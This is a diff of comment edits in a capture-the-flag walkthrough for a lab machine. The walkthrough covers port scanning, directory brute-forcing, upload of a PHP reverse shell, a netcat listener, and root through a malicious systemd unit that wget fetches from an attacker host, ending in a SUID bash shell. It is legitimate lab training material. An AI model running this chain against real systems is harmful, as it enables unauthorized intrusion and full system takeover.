@@ -42,8 +42,8 @@ systemctl enable /tmp/root.service && systemctl start root
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run a full port scan followed by service enumeration.
+# Why here: discover the entry point on the non-standard port 3333 and other potential targets like Samba and Squid.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
 nmap -sVC -p21,22,445,139,3128,3333 $TARGET -oN service
 ```
@@ -63,8 +63,8 @@ The web app on the **non-standard port** is the entry point. See [nmap.md](../..
 ## 2. Web Enumeration
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: brute-force directories on the web server running on port 3333.
+# Why here: find hidden endpoints like /internal/ which contains the vulnerable upload form.
 feroxbuster -u http://$TARGET:3333 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 # /internal/             ? upload form
 # /internal/uploads/     ? directory listing of past uploads (giveaway)
@@ -95,12 +95,12 @@ Save as `shell.phtml` (or rename in Burp from `shell.php` if the form accepts it
 ### 3b. Upload + trigger
 
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: set up a netcat listener to catch the reverse shell.
+# Why here: receive the callback from the uploaded .phtml payload.
 nc -lvnp 4444
 # Upload via the form, then:
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: trigger the uploaded PHP payload.
+# Why here: execute the reverse shell code on the server and gain a foothold as www-data.
 curl http://$TARGET:3333/internal/uploads/shell.phtml
 # whoami ? www-data
 ```
@@ -108,8 +108,8 @@ curl http://$TARGET:3333/internal/uploads/shell.phtml
 ### 3c. Stabilise
 
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: upgrade the simple shell to a fully interactive PTY.
+# Why here: allow for tab completion, command history, and proper execution of interactive tools during local enumeration.
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 # Ctrl+Z
@@ -125,8 +125,8 @@ Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md).
 
 ```bash
 # SUID sweep  empty / nothing pivots
-# What it does: searches the filesystem with the specified filters.
-# Why here: locate credentials, binaries, configs or writable paths.
+# What it does: search for SUID binaries on the system.
+# Why here: identify the systemctl binary with SUID permissions, which is the primary privilege escalation vector.
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 
@@ -134,8 +134,8 @@ find / -perm -u=s -type f 2>/dev/null
 # What it does: lists directory contents.
 # Why here: verificar archivos, permisos o loot en la ruta actual.
 ls -la /home/bill
-# What it does: lists sudo privileges of the current or specified user.
-# Why here: encontrar comandos permitidos para escalar privilegios.
+# What it does: list sudo permissions for the user bill.
+# Why here: confirm that bill can execute systemctl as root without a password, enabling the systemd unit privilege escalation.
 sudo -l -U bill
 # (root) NOPASSWD: /bin/systemctl
 ```
@@ -172,8 +172,8 @@ python3 -m http.server 3333
 # What it does: changes the current directory.
 # Why here: position in the necessary path for the next command.
 cd /tmp
-# What it does: downloads the specified URL to disk.
-# Why here: bring evidence, payloads or files needed to advance.
+# What it does: download the malicious systemd unit file to the target.
+# Why here: stage the root.service file in /tmp to be enabled and run via systemctl.
 wget http://$LHOST:3333/root.service
 ```
 
@@ -191,6 +191,8 @@ systemctl start root
 # Why here: verificar archivos, permisos o loot en la ruta actual.
 ls -l /bin/bash
 # -rwsr-xr-x 1 root root  /bin/bash
+# What it does: execute bash with the -p flag.
+# Why here: spawn a root shell by leveraging the SUID permission set by our systemd service on /bin/bash.
 /bin/bash -p
 # whoami ? root
 # What it does: displays a file in the terminal.
